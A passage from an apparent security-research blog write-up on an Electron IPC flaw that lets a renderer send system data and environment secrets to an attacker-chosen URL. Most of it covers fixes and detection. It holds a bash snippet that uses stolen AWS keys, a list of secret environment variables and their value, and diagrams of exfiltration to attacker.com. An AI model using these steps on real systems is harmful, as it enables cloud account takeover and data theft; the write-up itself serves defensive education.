+</code></pre><hr><h3 dir="ltr">Step 6 - Escalation from Initial Exfiltration</h3><p dir="ltr">The exfiltrated data is not just a one-time information disclosure. It can be the beginning of a full compromise:</p><p dir="ltr"><strong>From environment variables:</strong> If <code spellcheck="false">process.env</code> includes API keys, cloud credentials (AWS_ACCESS_KEY_ID, GOOGLE_APPLICATION_CREDENTIALS), or authentication tokens, an attacker can immediately use these to access cloud services, databases, and other infrastructure.</p><pre><code class="language-bash"># Example: Using stolen AWS credentials
+export AWS_ACCESS_KEY_ID=$(cat stolen_data/environment_vars.json | jq -r '.AWS_ACCESS_KEY_ID')
+export AWS_SECRET_ACCESS_KEY=$(cat stolen_data/environment_vars.json | jq -r '.AWS_SECRET_ACCESS_KEY')
+aws s3 ls  # Now browsing the victim's S3 buckets
+aws iam get-user  # Identify the account
+</code></pre><p dir="ltr"><strong>From session data:</strong> Active authentication tokens can be replayed to impersonate the user in other services without needing their password.</p><p dir="ltr"><strong>From system logs:</strong> System logs may reveal other vulnerabilities, software versions, internal hostnames, or infrastructure details useful for further attacks.</p><hr><h1 dir="ltr">PART THREE - IMPACT ANALYSIS</h1><hr><h2 dir="ltr">What Data Can Be Stolen - Full Breakdown</h2><p dir="ltr">The impact of this vulnerability goes far beyond "some system information was leaked." Here is a comprehensive breakdown of what can be collected and what an attacker can do with each piece.</p><hr><h3 dir="ltr">Environment Variables - The Crown Jewels</h3><p dir="ltr"><code spellcheck="false">process.env</code> contains all environment variables set in the user's session. Modern development workflows heavily rely on environment variables to store secrets, and many users and developers have credentials sitting in their environment.</p><p dir="ltr">Common sensitive environment variables:</p><pre><code>AWS_ACCESS_KEY_ID            → Full AWS access
+AWS_SECRET_ACCESS_KEY        → Paired with above — full cloud infrastructure access
+GITHUB_TOKEN                 → Access to GitHub repos, including private ones
+GOOGLE_APPLICATION_CREDENTIALS → GCP service account — full Google Cloud access
+DATABASE_URL                 → Direct database connection string with credentials
+API_KEY                      → Generic API key — varies by application
+OPENAI_API_KEY               → OpenAI credits and API usage
+STRIPE_SECRET_KEY            → Financial payment processing access
+SLACK_BOT_TOKEN              → Access to Slack workspace
+NPM_TOKEN                    → npm package publishing rights
+HEROKU_API_KEY               → Heroku deployment access
+AZURE_CLIENT_SECRET          → Azure cloud access
+</code></pre><p dir="ltr">A single stolen AWS secret key can give an attacker access to entire cloud infrastructure — servers, databases, storage, emails — worth thousands of dollars per month in compute, and containing company-critical data.</p><hr><h3 dir="ltr">Session and Authentication Data</h3><p dir="ltr">If the application stores session tokens, OAuth access tokens, or authentication cookies in accessible locations (app storage, temp files, etc.), the main process can collect and exfiltrate these. With a valid session token:</p><ul><li value="1">The attacker does not need the user's password</li><li value="2">They can impersonate the user in any service the token grants access to</li><li value="3">Many tokens are long-lived (days, weeks, or months)</li><li value="4">Two-factor authentication (2FA) does NOT protect against stolen tokens — the token was issued after 2FA was completed</li></ul><hr><h3 dir="ltr">Running Process List</h3><p dir="ltr">Knowing what processes are running tells an attacker:</p><ul><li value="1">What security tools are installed (antivirus, EDR agents, monitoring tools) → allows evasion</li><li value="2">What other applications are running → potential additional attack targets</li><li value="3">What development tools are active → signals technical sophistication of the user</li><li value="4">Internal company tool names → useful for targeted social engineering</li></ul><hr><h3 dir="ltr">Network Interface Information</h3><p dir="ltr"><code spellcheck="false">os.networkInterfaces()</code> provides:</p><ul><li value="1">All network adapters (Ethernet, Wi-Fi, VPN, virtual interfaces)</li><li value="2">IP addresses (both IPv4 and IPv6)</li><li value="3">MAC addresses (hardware addresses unique to network cards)</li><li value="4">Subnet information</li></ul><p dir="ltr">This is valuable for network reconnaissance. MAC addresses can be used to track physical devices. Internal IP ranges reveal corporate network architecture.</p><hr><h3 dir="ltr">System Logs</h3><p dir="ltr">System event logs (Windows Event Log, macOS syslog, Linux journalctl) contain:</p><ul><li value="1">Recent login and logout events</li><li value="2">Failed authentication attempts</li><li value="3">Application error messages (may contain sensitive data in stack traces)</li><li value="4">Network connection records</li><li value="5">Security policy changes</li><li value="6">Scheduled task history</li></ul><hr><h3 dir="ltr">User Information</h3><p dir="ltr"><code spellcheck="false">os.userInfo()</code> provides:</p><ul><li value="1">Username (login name)</li><li value="2">User ID and Group ID</li><li value="3">Home directory path</li><li value="4">Default shell</li></ul><p dir="ltr">This is useful for targeted attacks. Knowing the username allows crafting more convincing phishing or social engineering attacks.</p><hr><h2 dir="ltr">The Proxy Abuse Dimension</h2><p dir="ltr">One subtle but important aspect of this vulnerability is that the exfiltrated data leaves the victim's machine from a <strong>trusted, legitimate application</strong> — not from suspicious software or an unknown process.</p><p dir="ltr">From the perspective of a corporate firewall or network monitoring tool, the outbound connection looks like:</p><pre><code>[Legitimate Electron Application] → HTTPS POST → [attacker-server.com]
+</code></pre><p dir="ltr">Not:</p><pre><code>[Unknown Malware Process] → Connection → [attacker-server.com]
+</code></pre><p dir="ltr">This makes detection significantly harder. Many corporate security tools whitelist known applications or at minimum flag unknown processes more aggressively. The attacker is hiding behind the app's legitimacy.</p><hr><h1 dir="ltr">PART FOUR - ROOT CAUSE AND SECURE DESIGN</h1><hr><h2 dir="ltr">Why Developers Make This Mistake</h2><p dir="ltr">Understanding why this vulnerability gets introduced helps prevent it in the future.</p><hr><h3 dir="ltr">Optimism Bias in Development</h3><p dir="ltr">Developers writing application code are focused on making things work correctly for legitimate users. They write the happy path: "A user clicks 'Send Diagnostics', the app uploads the data, success." They are not thinking: "What if the URL in this message was injected by an attacker?"</p><p dir="ltr">This optimism bias — assuming that code will only ever be used as intended — is the single most common cause of security vulnerabilities.</p><hr><h3 dir="ltr">IPC Looks Like a Function Call</h3><p dir="ltr">The IPC API is designed to feel like calling a regular function. <code spellcheck="false">ipcRenderer.invoke('upload-diagnostics', params)</code> looks almost identical to calling a local function <code spellcheck="false">uploadDiagnostics(params)</code>. This familiar syntax makes it easy to forget that the two sides of this call are in completely different, differently-trusted execution environments.</p><hr><h3 dir="ltr">Documentation and Security Training Gaps</h3><p dir="ltr">Many Electron tutorials and starter templates do not emphasise security. Developers learning from these resources build habits around insecure patterns without realising it. Security is often treated as something to "add later" rather than a foundational design consideration.</p><hr><h2 dir="ltr">The Principle of Least Privilege - A Deep Dive</h2><p dir="ltr">The Principle of Least Privilege (PoLP) states that every component of a system should have access to exactly what it needs to do its job — and absolutely nothing more.</p><p dir="ltr">Applied to this vulnerability:</p><p dir="ltr">The renderer process needed to tell the main process: "please send diagnostic data." That is it. The renderer had ZERO legitimate need to know or specify WHERE that data goes. The destination is a configuration concern — it should live in the main process configuration, hardcoded or loaded from a trusted config file at startup.</p><p dir="ltr">By allowing the renderer to supply the destination, the developers granted the renderer far more influence over a privileged operation than it needed. This is a direct violation of PoLP.</p><p dir="ltr">Think of it this way: if you are a hospital administrator, and you instruct an orderly to deliver medical records somewhere, the orderly does not get to decide the destination based on what a patient wrote on a note and handed them. The destination is determined by the hospital's secure, internal routing procedures — completely out of the patient's hands.</p><hr><h2 dir="ltr">The Trust Boundary Violation - Illustrated</h2><pre><code>┌─────────────────────────────────────────────────────────────┐
+│                    SECURE ARCHITECTURE                       │
+│                                                             │
+│  ┌─────────────────┐         ┌──────────────────────────┐  │
+│  │  RENDERER       │         │  MAIN PROCESS            │  │
+│  │  (Untrusted)    │         │  (Trusted)               │  │
+│  │                 │         │                          │  │
+│  │  "Please send   │──IPC──► │  Receives request.       │  │
+│  │   diagnostics"  │         │  Validates sender.       │  │
+│  │                 │         │  Uses INTERNAL config    │  │
+│  │  (No URL given) │         │  to determine WHERE.     │  │
+│  │                 │         │  Collects data.          │  │
+│  └─────────────────┘         │  Sends to TRUSTED URL.   │  │
+│                              └──────────────────────────┘  │
+└─────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────┐
+│                  VULNERABLE ARCHITECTURE                     │
+│                                                             │
+│  ┌─────────────────┐         ┌──────────────────────────┐  │
+│  │  RENDERER       │         │  MAIN PROCESS            │  │
+│  │  (Compromised!) │         │  (No validation)         │  │
+│  │                 │         │                          │  │
+│  │  "Please send   │──IPC──► │  Receives request.       │  │
+│  │   diagnostics   │         │  Blindly trusts URL.     │  │
+│  │   TO attacker   │         │  Collects data.          │  │
+│  │   .com/steal"   │         │  Sends to ATTACKER URL.  │  │
+│  │                 │         │                          │  │
+│  └─────────────────┘         └──────────────────────────┘  │
+│                                         │                   │
+│                                         ▼                   │
+│                              [attacker.com receives data]   │
+└─────────────────────────────────────────────────────────────┘
+</code></pre><hr><h1 dir="ltr">PART FIVE - MITIGATION AND SECURE IMPLEMENTATION</h1><hr><h2 dir="ltr">Fix 1 - Remove Renderer Control Over Destination</h2><p dir="ltr">This is the most important fix. The destination URL should NEVER come from the renderer. Period.</p><p dir="ltr"><strong>Insecure (What NOT to do):</strong></p><pre><code class="language-javascript">// ❌ WRONG — Renderer controls the destination
+ipcMain.handle('upload-diagnostics', async (event, params) =&gt; {
+  const destination = params.destination; // ← Attacker controls this
+  await uploadData(collectedData, destination);
+});
+</code></pre><p dir="ltr"><strong>Secure (What TO do):</strong></p><pre><code class="language-javascript">// ✅ CORRECT — Destination is defined internally, renderer has no say
+const DIAGNOSTICS_ENDPOINT = 'https://diagnostics.yourcompany.com/v1/upload';
+
+ipcMain.handle('upload-diagnostics', async (event) =&gt; {
+  // Note: no params from renderer are used for the destination
+  const data = await collectDiagnosticData();
+  await uploadData(data, DIAGNOSTICS_ENDPOINT); // ← Hardcoded trusted destination
+  return { success: true };
+});
+</code></pre><hr><h2 dir="ltr">Fix 2 - Implement Strict Allowlist Validation</h2><p dir="ltr">If the application genuinely needs to support multiple destinations (e.g., different environments — dev, staging, production), use an allowlist — a whitelist of pre-approved values.</p><pre><code class="language-javascript">// ✅ SECURE ALLOWLIST PATTERN
+
+const ALLOWED_DESTINATIONS = new Map([
+  ['production',  'https://diagnostics.yourcompany.com/upload'],
+  ['staging',     'https://staging-diagnostics.yourcompany.com/upload'],
+  ['development', 'https://dev-diagnostics.localhost:8443/upload'],
+]);
+
+ipcMain.handle('upload-diagnostics', async (event, params) =&gt; {
+  // Validate sender
+  const senderURL = event.senderFrame.url;
+  if (!senderURL.startsWith('file:///')) {
+    throw new Error('IPC message rejected: untrusted sender origin');
+  }
+
+  // Validate the environment identifier against the allowlist
+  const requestedEnv = params.environment;
+  
+  if (typeof requestedEnv !== 'string') {
+    throw new Error('Invalid params: environment must be a string');
+  }
+
+  const destination = ALLOWED_DESTINATIONS.get(requestedEnv);
+  
+  if (!destination) {
+    // Log the suspicious request
+    console.warn(`[SECURITY] Rejected IPC request with unknown environment: ${requestedEnv}`);
+    throw new Error(`Unknown environment: ${requestedEnv}`);
+  }
+
+  // Proceed with the trusted, pre-approved destination
+  const data = await collectDiagnosticData();
+  await uploadData(data, destination);
+  return { success: true };
+});
+</code></pre><p dir="ltr">Notice that even in this pattern, the renderer only supplies an identifier string (<code spellcheck="false">'production'</code>), not the actual URL. The main process maps that identifier to the URL internally.</p><hr><h2 dir="ltr">Fix 3 - Validate the IPC Message Sender</h2><p dir="ltr">Electron's IPC event object provides information about who sent the message. Use this to verify the message originated from a trusted frame.</p><pre><code class="language-javascript">// ✅ SENDER VALIDATION
+
+ipcMain.handle('upload-diagnostics', async (event, params) =&gt; {
+  // Get the URL of the frame that sent this IPC message
+  const senderURL = event.senderFrame.url;
+
+  // For local app pages, the URL starts with 'file:///'
+  // For remote web content loaded via HTTPS, check the specific origin
+  const isTrustedSender = 
+    senderURL.startsWith('file:///') || 
+    senderURL.startsWith('app://');  // Some Electron apps use custom protocols
+
+  if (!isTrustedSender) {
+    console.error(`[SECURITY ALERT] IPC message rejected from untrusted origin: ${senderURL}`);
+    throw new Error('Security violation: IPC from untrusted sender');
+  }
+
+  // Continue with safe processing...
+});
+</code></pre><hr><h2 dir="ltr">Fix 4 - Validate All Input Parameters with a Schema</h2><p dir="ltr">Every IPC handler should validate the structure and content of incoming parameters before using them.</p><pre><code class="language-javascript">// ✅ SCHEMA VALIDATION USING A VALIDATION LIBRARY
+
+const Joi = require('joi'); // Or use zod, yup, or manual checks
+
+// Define the allowed shape of the params object
+const diagnosticsParamsSchema = Joi.object({
+  // Only allow specific known fields
+  reportType: Joi.string().valid('crash', 'performance', 'general').required(),
+  includeSystemInfo: Joi.boolean().default(true),
+  // Explicitly REJECT any 'destination' field
+  // (by not listing it, Joi will reject it in strict mode)
+}).options({ allowUnknown: false, stripUnknown: false });
+
+ipcMain.handle('upload-diagnostics', async (event, params) =&gt; {
+  // Validate sender
+  if (!isTrustedSender(event.senderFrame)) {
+    throw new Error('Untrusted sender');
+  }
+
+  // Validate params
+  const { error, value } = diagnosticsParamsSchema.validate(params);
+  if (error) {
+    console.warn(`[SECURITY] IPC params validation failed: ${error.message}`);
+    throw new Error('Invalid parameters');
+  }
+
+  // Use validated params only
+  const data = await collectDiagnosticData(value.reportType, value.includeSystemInfo);
+  await uploadData(data, TRUSTED_ENDPOINT); // Always the hardcoded destination
+  return { success: true };
+});
+</code></pre><hr><h2 dir="ltr">Fix 5 - Enable All Electron Security Features</h2><p dir="ltr">These settings should be the default for every Electron application. They are the security foundation that limits the blast radius of any renderer compromise.</p><pre><code class="language-javascript">// ✅ SECURE BROWSERWINDOW CONFIGURATION
+
+const { BrowserWindow } = require('electron');
+
+const mainWindow = new BrowserWindow({
+  webPreferences: {
+    // CRITICAL — Isolates the renderer's JS from Electron's APIs
+    // Without this, the renderer can access ipcRenderer directly from window
+    contextIsolation: true,
+
+    // CRITICAL — Prevents renderer from using Node.js APIs
+    // Even if contextIsolation is bypassed, nodeIntegration: false is a backup
+    nodeIntegration: false,
+
+    // Runs the renderer in a sandboxed process
+    // Similar to how browser tabs are sandboxed
+    sandbox: true,
+
+    // Prevents loading insecure mixed content
+    allowRunningInsecureContent: false,
+
+    // Disables the ability to navigate to arbitrary URLs
+    navigationDisable: true,
+
+    // Only load the preload script you explicitly specify
+    preload: path.join(__dirname, 'preload.js'),
+  }
+});
+</code></pre><hr><h2 dir="ltr">Fix 6 - Use a Secure Preload Script Pattern (contextBridge)</h2><p dir="ltr">When <code spellcheck="false">contextIsolation: true</code>, the renderer cannot call <code spellcheck="false">require('electron')</code> directly. Instead, you expose only the specific, limited APIs the renderer needs through a <code spellcheck="false">contextBridge</code>. This is the modern, secure Electron development pattern.</p><pre><code class="language-javascript">// preload.js — The secure bridge between renderer and main
+
+const { contextBridge, ipcRenderer } = require('electron');
+
+// Only expose the specific functions the renderer legitimately needs
+// The renderer gets these clean, limited functions — nothing else
+contextBridge.exposeInMainWorld('electronAPI', {
+  
+  // The renderer can ONLY call this function, with NO parameters
+  // It cannot pass a destination URL — that's not an option
+  uploadDiagnostics: () =&gt; ipcRenderer.invoke('upload-diagnostics'),
+
+  // Another example: renderer can request to open a file, but cannot
+  // specify arbitrary paths — only pre-approved operations
+  openUserDataFolder: () =&gt; ipcRenderer.invoke('open-user-data-folder'),
+});
+
+// The renderer does NOT get access to the full ipcRenderer object
+// It cannot call ipcRenderer.invoke with arbitrary channels or params
+</code></pre><p dir="ltr">In the renderer:</p><pre><code class="language-javascript">// renderer.js — The secure renderer side
+
+// The renderer can only do what the contextBridge exposes
+// It does NOT have ipcRenderer, require(), or Node.js access
+
+document.getElementById('sendDiagnosticsBtn').addEventListener('click', async () =&gt; {
+  // ✅ This is the only way to trigger diagnostics — no URL parameter possible
+  const result = await window.electronAPI.uploadDiagnostics();
+  console.log('Result:', result);
+});
+
+// This would fail because ipcRenderer is not available in the renderer:
+// const { ipcRenderer } = require('electron'); // ← ReferenceError: require is not defined
+</code></pre><hr><h2 dir="ltr">Fix 7 - Implement a Content Security Policy (CSP)</h2><p dir="ltr">A Content Security Policy tells the browser/Chromium engine which sources of scripts, styles, and other resources are allowed to load. This is a critical defence against XSS attacks — even if someone injects a script tag, the CSP can prevent it from executing.</p><pre><code class="language-javascript">// In your main process, set a strict CSP for all loaded pages
+
+const { session } = require('electron');
+
+session.defaultSession.webRequest.onHeadersReceived((details, callback) =&gt; {
+  callback({
+    responseHeaders: {
+      ...details.responseHeaders,
+      'Content-Security-Policy': [
+        // Only allow scripts from the app itself (file:///)
+        // No inline scripts, no external scripts
+        "default-src 'self' file:; " +
+        "script-src 'self' file:; " +
+        "connect-src 'self' https://diagnostics.yourcompany.com; " +
+        "img-src 'self' file: data:; " +
+        "style-src 'self' file: 'unsafe-inline'; " +
+        "object-src 'none'; " +
+        "base-uri 'self'"
+      ]
+    }
+  });
+});
+</code></pre><hr><h2 dir="ltr">Fix 8 - Log, Monitor, and Alert on Suspicious IPC Patterns</h2><p dir="ltr">Security controls are not just about prevention — they are also about detection. Implement logging so that suspicious IPC activity (like rejected requests with unknown destinations) triggers alerts.</p><pre><code class="language-javascript">// ✅ SECURITY LOGGING PATTERN
+
+const securityLogger = require('./security-logger'); // Your logging implementation
+
+ipcMain.handle('upload-diagnostics', async (event, params) =&gt; {
+  
+  // Log every invocation of privileged IPC handlers
+  securityLogger.info({
+    event: 'ipc_invocation',
+    channel: 'upload-diagnostics',
+    senderURL: event.senderFrame?.url,
+    timestamp: new Date().toISOString(),
+    paramsKeys: Object.keys(params || {}), // Log param keys but NOT values (avoid logging sensitive data)
+  });
+
+  // If validation fails, log it as a security event
+  if (!isValidSender(event.senderFrame)) {
+    securityLogger.warn({
+      event: 'ipc_security_violation',
+      reason: 'untrusted_sender',
+      senderURL: event.senderFrame?.url,
+      timestamp: new Date().toISOString(),
+    });
+    throw new Error('Security violation');
+  }
+
+  // Continue with secure processing...
+});
+</code></pre><hr><h2 dir="ltr">Complete Secure Implementation - Putting It All Together</h2><pre><code class="language-javascript">// main.js — FULLY SECURED IMPLEMENTATION
+
+const { app, BrowserWindow, ipcMain, session } = require('electron');
+const path = require('path');
+const os = require('os');
+const Joi = require('joi');
+
+// ═══════════════════════════════════════════════════════════
+// CONFIGURATION — All sensitive config lives here, in main
+// ═══════════════════════════════════════════════════════════
+
+const CONFIG = {
+  diagnosticsEndpoint: 'https://diagnostics.yourcompany.com/v1/upload',
+  trustedOrigins: ['file:///', 'app://'],
+};
+
+// ═══════════════════════════════════════════════════════════
+// VALIDATION SCHEMA
+// ═══════════════════════════════════════════════════════════
+
+const diagnosticsSchema = Joi.object({
+  reportType: Joi.string().valid('crash', 'performance', 'general').required(),
+}).options({ allowUnknown: false });
+
+// ═══════════════════════════════════════════════════════════
+// SECURE IPC HANDLER
+// ═══════════════════════════════════════════════════════════
+
+ipcMain.handle('upload-diagnostics', async (event, params) =&gt; {
+  
+  // Step 1: Validate sender
+  const senderURL = event.senderFrame?.url || '';
+  const isTrusted = CONFIG.trustedOrigins.some(origin =&gt; senderURL.startsWith(origin));
+  
+  if (!isTrusted) {
+    console.error(`[SECURITY] Rejected IPC from: ${senderURL}`);
+    throw new Error('Untrusted IPC sender');
+  }
+
+  // Step 2: Validate params
+  const { error, value } = diagnosticsSchema.validate(params);
+  if (error) {
+    console.warn(`[SECURITY] Invalid IPC params: ${error.message}`);
+    throw new Error('Invalid parameters');
+  }
+
+  // Step 3: Collect data
+  const diagnosticData = {
+    platform: os.platform(),
+    hostname: os.hostname(),
+    appVersion: app.getVersion(),
+    reportType: value.reportType,
+    timestamp: new Date().toISOString(),
+    // Note: NOT including process.env or other sensitive data unless necessary
+    // Principle of least privilege: only collect what you genuinely need
+  };
+
+  // Step 4: Upload to HARDCODED, TRUSTED endpoint — never from renderer input
+  await uploadDiagnostics(diagnosticData, CONFIG.diagnosticsEndpoint);
+
+  return { success: true };
+});
+
+// ═══════════════════════════════════════════════════════════
+// SECURE WINDOW CREATION
+// ═══════════════════════════════════════════════════════════
+
+function createWindow() {
+  const win = new BrowserWindow({
+    width: 1200,
+    height: 800,
+    webPreferences: {
+      contextIsolation: true,      // ✅ Mandatory
+      nodeIntegration: false,       // ✅ Mandatory
+      sandbox: true,                // ✅ Recommended
+      preload: path.join(__dirname, 'preload.js'),
+      allowRunningInsecureContent: false,
+      webSecurity: true,
+    }
+  });
+
+  // Apply CSP to all requests
+  session.defaultSession.webRequest.onHeadersReceived((details, callback) =&gt; {
+    callback({
+      responseHeaders: {
+        ...details.responseHeaders,
+        'Content-Security-Policy': ["default-src 'self' file:; script-src 'self' file:; object-src 'none'"]
+      }
+    });
+  });
+
+  win.loadFile('index.html');
+}
+
+app.whenReady().then(createWindow);
+</code></pre><hr><h1 dir="ltr">PART SIX - DETECTION AND INDICATORS OF COMPROMISE</h1><hr><h2 dir="ltr">How to Detect If You Have Been Exploited</h2><p dir="ltr">If you suspect this vulnerability has been exploited in a deployed application, here are the indicators to look for.</p><hr><h3 dir="ltr">Network-Based Detection</h3><p dir="ltr">Monitor outbound HTTPS connections from the application process. Legitimate applications typically connect to a small, known set of endpoints. An anomalous HTTPS POST request to an unfamiliar domain, especially one carrying a large payload, is suspicious.</p><pre><code class="language-bash"># On Linux — monitor network connections from the app process
+pid=$(pgrep -f "your-electron-app")
+ss -tp | grep $pid
+
+# Using Wireshark or tcpdump — capture app's traffic
+sudo tcpdump -i any -w electron_traffic.pcap -f "pid $pid"
+
+# On macOS — monitor with lsof
+lsof -i -n -P | grep "your-electron-app"
+</code></pre><hr><h3 dir="ltr">Log-Based Detection</h3><p dir="ltr">In the application's logs (if security logging was implemented), look for:</p><ul><li value="1">IPC invocations from unexpected sender origins</li><li value="2">Failed validation attempts (suggesting someone probing the handler)</li><li value="3">Unusual frequency of the <code spellcheck="false">upload-diagnostics</code> channel being invoked</li></ul><hr><h3 dir="ltr">File System Detection</h3><p dir="ltr">The vulnerable implementation writes a temporary archive before uploading it. Look for unexpected ZIP files in the application's temp directory:</p><pre><code class="language-bash"># On Linux/macOS
+find /tmp -name "diagnostics_*.zip" -newer /tmp -ls
+
+# On Windows (PowerShell)
+Get-ChildItem $env:TEMP -Filter "diagnostics_*.zip" | Select-Object Name, CreationTime, Length
+</code></pre><hr><h3 dir="ltr">Endpoint Detection and Response (EDR) Signals</h3><p dir="ltr">Modern EDR tools should flag:</p><ul><li value="1">A non-browser application making an HTTPS connection to an uncategorised domain</li><li value="2">A process spawning child processes (to collect system logs via <code spellcheck="false">execSync</code>)</li><li value="3">Large outbound data transfers from a desktop application</li></ul><hr><h1 dir="ltr">PART SEVEN - SUMMARY AND CONCLUSIONS</h1><h2 dir="ltr">The Core Lesson</h2><p dir="ltr">A single missing validation — checking whether the URL supplied in an IPC message is legitimate — transformed a feature (diagnostic upload) into a critical information disclosure vulnerability.</p><p dir="ltr">This is the nature of most real-world security vulnerabilities. They are not exotic or complex. They are moments where trust was assumed instead of verified, where a shortcut was taken, where "it works correctly" was conflated with "it is secure."</p><p dir="ltr">Security is not about making things work when users behave as expected. Security is about ensuring that nothing catastrophic happens when they do not.</p><hr><h2 dir="ltr">Five Key Takeaways for Developers</h2><p dir="ltr"><strong>1. Treat every IPC message as untrusted.</strong> It might not be from your own code. Validate sender, validate structure, validate content.</p><p dir="ltr"><strong>2. Never let the renderer control the destination of privileged operations.</strong> If the renderer does not need to know where data goes, do not tell it — and do not let it tell you.</p><p dir="ltr"><strong>3. Use the minimum permissions needed.</strong> If a feature can work without the renderer knowing a URL, design it that way. Remove options you do not need to offer.</p><p dir="ltr"><strong>4. Enable Electron's security features from day one.</strong> <code spellcheck="false">contextIsolation</code>, <code spellcheck="false">nodeIntegration: false</code>, <code spellcheck="false">sandbox</code>. These are not optional extras — they are baseline requirements.</p><p dir="ltr"><strong>5. Security is a design activity, not a testing activity.</strong> These vulnerabilities are hard to add after the fact. Secure architecture decisions need to happen during design, not after deployment.</p><hr><h2 dir="ltr">References and Standards</h2><ul><li value="1">Electron Security Documentation: https://www.electronjs.org/docs/latest/tutorial/security</li><li value="2">Electron IPC Security Guide: https://www.electronjs.org/docs/latest/tutorial/ipc</li><li value="3">Electron Security Checklist: https://www.electronjs.org/docs/latest/tutorial/security#checklist-security-recommendations</li><li value="4">OWASP SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</li><li value="5">OWASP Input Validation Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html</li><li value="6">CWE-20 — Improper Input Validation: https://cwe.mitre.org/data/definitions/20.html</li><li value="7">CWE-441 — Unintended Proxy or Intermediary: https://cwe.mitre.org/data/definitions/441.html</li><li value="8">CWE-918 — Server-Side Request Forgery: https://cwe.mitre.org/data/definitions/918.html</li><li value="9">CWE-284 — Improper Access Control: https://cwe.mitre.org/data/definitions/284.html</li><li value="10">NIST SP 800-53 — Security and Privacy Controls (AC-3, AC-6, SC-7, SI-10)</li><li value="11">npm Security Advisory Database: https://github.com/advisories</li></ul><hr><p dir="ltr"><i><em class="italic">This document is written for educational and security research purposes. All payloads and proof-of-concept code are provided to help developers understand the real-world mechanics of this class of vulnerability so that they can build more secure applications. Always obtain proper authorisation before performing security testing on any system.</em></i></p></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on June 13, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://w4nn4d13.github.io/tags/application-security/">Application Security</a></li><li><a href="https://w4nn4d13.github.io/tags/desktop-application/">Desktop Application</a></li><li><a href="https://w4nn4d13.github.io/tags/security-research/">Security Research</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fw4nn4d13.github.io%2Finsecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints.html" class="js-share facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fw4nn4d13.github.io%2Finsecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints.html&amp;via=0x5t4l1n&amp;text=Insecure%20IPC%20Channel%20Allows%20Sensitive%20System%20Data%20Exfiltration%20to%20Arbitrary%20External%20Endpoints" class="js-share twitter" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#twitter"/></svg> <span>Twitter</span> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fw4nn4d13.github.io%2Finsecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints.html&amp;media=undefined&amp;description=Insecure%20IPC%20Channel%20Allows%20Sensitive%20System%20Data%20Exfiltration%20to%20Arbitrary%20External%20Endpoints" class="js-share pinterest" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#pinterest"/></svg> <span>Pinterest</span> </a><a href="https://mix.com/add?url=https%3A%2F%2Fw4nn4d13.github.io%2Finsecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints.html" class="js-share mix" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#mix"/></svg> <span>Mix</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fw4nn4d13.github.io%2Finsecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints.html" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=Insecure%20IPC%20Channel%20Allows%20Sensitive%20System%20Data%20Exfiltration%20to%20Arbitrary%20External%20Endpoints&amp;url=https%3A%2F%2Fw4nn4d13.github.io%2Finsecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints.html" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=Insecure%20IPC%20Channel%20Allows%20Sensitive%20System%20Data%20Exfiltration%20to%20Arbitrary%20External%20Endpoints https%3A%2F%2Fw4nn4d13.github.io%2Finsecure-ipc-channel-allows-sensitive-system-data-exfiltration-to-arbitrary-external-endpoints.html" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://w4nn4d13.github.io/authors/w4nn4d13/" rel="author">w4nn4d13</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://w4nn4d13.github.io/cve-2026-42290.html" class="content__nav-link" rel="prev"><div><span>Previous</span> CVE-2026-42290</div></a></div><div class="content__nav-next"><a href="https://w4nn4d13.github.io/cve-2026-32138-api-key-exposure-in-nexulean-website.html" class="content__nav-link" rel="next"><div><span>Next</span> CVE-2026-32138 API Key Exposure in Nexulean Website</div></a></div></div></div></nav></footer></article><div class="content__comments"><div class="entry-wrapper"></div></div><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a 